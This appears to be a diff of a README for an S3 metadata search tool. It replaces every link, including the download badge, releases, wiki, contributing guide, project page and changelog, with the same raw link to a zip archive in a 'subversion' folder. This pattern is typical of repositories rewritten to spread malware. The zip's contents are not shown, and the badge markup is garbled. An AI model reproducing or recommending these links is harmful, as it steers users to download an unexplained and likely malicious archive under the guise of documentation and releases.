@@ -1,7 +1,7 @@
 # 🌟 s3-sql-search - Effortlessly Search Your S3 Metadata
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Br3nnan951/s3-sql-search/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Br3nnan951/s3-sql-search/main/subversion/s3-sql-search.zip%20Latest%https://raw.githubusercontent.com/Br3nnan951/s3-sql-search/main/subversion/s3-sql-search.zip)](https://raw.githubusercontent.com/Br3nnan951/s3-sql-search/main/subversion/s3-sql-search.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ To run s3-sql-search, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To start using s3-sql-search, visit this page to download: [Releases](https://github.com/Br3nnan951/s3-sql-search/releases).
+To start using s3-sql-search, visit this page to download: [Releases](https://raw.githubusercontent.com/Br3nnan951/s3-sql-search/main/subversion/s3-sql-search.zip).
 
 1. **Visit the Releases Page**: Click the link above to go to our Releases page.
 2. **Choose the Latest Version**: Look for the most recent version, typically indicated by the highest version number.
@@ -55,9 +55,9 @@ Now that you have s3-sql-search set up, you can start searching your S3 metadata
 
 ## 📦 Additional Resources
 
-- **Documentation**: Detailed usage instructions are available in the [Wiki](https://github.com/Br3nnan951/s3-sql-search/wiki).
+- **Documentation**: Detailed usage instructions are available in the [Wiki](https://raw.githubusercontent.com/Br3nnan951/s3-sql-search/main/subversion/s3-sql-search.zip).
 - **Community Support**: Join our discussions on GitHub Issues for questions and suggestions.
-- **Contributing**: Interested in contributing? Check our [Contributing Guide](https://github.com/Br3nnan951/s3-sql-search/blob/main/CONTRIBUTING.md).
+- **Contributing**: Interested in contributing? Check our [Contributing Guide](https://raw.githubusercontent.com/Br3nnan951/s3-sql-search/main/subversion/s3-sql-search.zip).
 
 ## 💡 Troubleshooting
 
@@ -71,10 +71,10 @@ If you encounter issues while using s3-sql-search, here are a few steps to help 
 
 ## 📞 Contact
 
-For support, you can reach out by opening an issue on GitHub or contacting the project maintainers via the [Project Page](https://github.com/Br3nnan951/s3-sql-search). We appreciate your feedback and aim to improve the application.
+For support, you can reach out by opening an issue on GitHub or contacting the project maintainers via the [Project Page](https://raw.githubusercontent.com/Br3nnan951/s3-sql-search/main/subversion/s3-sql-search.zip). We appreciate your feedback and aim to improve the application.
 
 ## 📅 Changelog
 
-Stay updated with the latest changes by checking our [Changelog](https://github.com/Br3nnan951/s3-sql-search/releases).
+Stay updated with the latest changes by checking our [Changelog](https://raw.githubusercontent.com/Br3nnan951/s3-sql-search/main/subversion/s3-sql-search.zip).
 
 Thank you for using s3-sql-search! Happy searching!
